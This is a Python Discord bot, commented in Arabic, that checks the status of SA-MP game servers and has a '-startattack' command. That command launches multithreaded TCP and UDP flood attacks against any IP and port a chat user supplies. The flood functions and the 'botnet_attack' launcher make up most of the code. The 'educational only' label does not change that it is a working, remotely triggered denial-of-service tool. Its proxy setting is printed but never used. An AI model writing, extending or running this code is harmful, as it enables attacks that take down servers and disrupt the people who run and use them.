import discord
from discord.ext import commands
import socket
import random
import threading
import time

# =========================
# إدخال التوكن من المستخدم عند التشغيل
# =========================
bot_token = input("أدخل توكن البوت هنا: ")

# =========================
# إعداد البوت (إصلاح خطأ help هنا)
# =========================
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="-", intents=intents, help_command=None)

# =========================
# متغير لتخزين الثريدات الحالية
# =========================
attack_threads = []
attack_running = False

# =========================
# قائمة البروكسيات
# =========================
proxies = [
    "192.168.1.1:8080",
    "192.168.1.2:8080",
    "192.168.1.3:8080",
    # أضف المزيد إن أردت
]

# =========================
# فحص سيرفر SAMP
# =========================
def check_samp_status(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)
        s.sendto(b'\xFF\xFF\xFF\xFF\x02', (ip, port))
        data, addr = s.recvfrom(1024)
        if data:
            return "✅ السيرفر متصل ورد بنجاح!"
        else:
            return "❌ فشل الاتصال بالخادم!"
    except socket.timeout:
        return "⏱️ فشل الاتصال - انتهت المهلة!"
    except Exception as e:
        return f"⚠️ خطأ: {str(e)}"

# =========================
# أوامر البوت
# =========================

@bot.command(name="sampstatus")
async def sampstatus(ctx, ip: str, port: int):
    await ctx.send(f"📡 فحص حالة السيرفر `{ip}:{port}`...")
    status = check_samp_status(ip, port)
    await ctx.send(f"🔍 النتيجة: {status}")

@bot.command(name="help")
async def help_command(ctx):
    embed = discord.Embed(
        title="📘 قائمة أوامر البوت",
        description="هادو هما الأوامر المتاحة:",
        color=discord.Color.blue()
    )
    embed.add_field(name="`-sampstatus <ip> <port>`", value="🔹 فحص حالة سيرفر SAMP.", inline=False)
    embed.add_field(name="`-startattack <ip> <port> <threads> <proxy>`", value="🔹 تشغيل هجوم (للاستخدام الخاص فقط!).", inline=False)
    embed.add_field(name="`-help`", value="🔹 عرض هذه القائمة.", inline=False)
    embed.set_footer(text="بوت فحص وهجوم تعليمي فقط.")
    await ctx.send(embed=embed)

# =========================
# دوال الهجوم (للاستخدام الخاص فقط)
# =========================

def syn_flood(ip, port, stop_event, proxy=None):
    data = random._urandom(100000)
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            s.close()
        except:
            pass

def udp_flood(ip, port, stop_event, proxy=None):
    data = random._urandom(100000)
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(data, (ip, port))
        except:
            pass

def tcp_flood(ip, port, stop_event, proxy=None):
    data = random._urandom(100000)
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            s.close()
        except:
            pass

def botnet_attack(ip, port, threads, proxy=None):
    global attack_threads, attack_running
    stop_event = threading.Event()

    if not proxy:
        proxy = random.choice(proxies)
    
    print(f"البروكسي المستخدم في الهجوم: {proxy}")
    
    for _ in range(threads):
        for attack_func in [syn_flood, udp_flood, tcp_flood]:
            th = threading.Thread(target=attack_func, args=(ip, port, stop_event, proxy))
            th.start()
            attack_threads.append((th, stop_event))

    attack_running = True

def stop_attack():
    global attack_threads, attack_running
    for th, stop_event in attack_threads:
        stop_event.set()
        th.join(timeout=1)
    attack_threads = []
    attack_running = False

@bot.command(name="startattack")
async def start_attack(ctx, ip: str, port: int, threads: int, proxy: str = None):
    global attack_running

    if attack_running:
        await ctx.send("⏹️ جاري توقيف الهجوم السابق...")
        stop_attack()

    if not proxy:
        proxy = random.choice(proxies)
        await ctx.send(f"البروكسي العشوائي المستخدم: {proxy}")
    else:
        await ctx.send(f"البروكسي المحدد: {proxy}")
    
    await ctx.send(f"🚀 بدء الهجوم على `{ip}:{port}` بعدد `{threads}` من الثريدات باستخدام البروكسي `{proxy}`.")
    botnet_attack(ip, port, threads, proxy)
    await ctx.send("✅ الهجوم انطلق بنجاح.")

# =========================
# تشغيل البوت
# =========================
bot.run(bot_token)
